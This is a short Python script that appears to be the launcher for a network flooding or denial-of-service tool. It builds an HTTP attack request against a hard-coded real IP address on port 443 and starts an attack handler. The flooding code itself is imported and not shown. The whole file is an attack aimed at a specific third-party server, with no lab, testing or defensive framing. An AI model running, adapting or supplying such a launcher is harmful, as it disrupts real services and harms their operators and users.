from attacks import AttackHandler
from packets import PacketSizes
from shared.attacks import AttackRequest, AttackTypes
from shared.attacks.http import HttpAddress
from shared.attacks.targets import Target


def main() -> None:
    attack_request: AttackRequest = AttackRequest(
        address=HttpAddress(Target(ip="62.173.139.141", port=443)),
        size=PacketSizes.LOW,
        attack_type=AttackTypes.HTTP,
    )

    attack_handler: AttackHandler = AttackHandler(attack_request=attack_request)
    attack_handler.start()


if __name__ == "__main__":
    main()
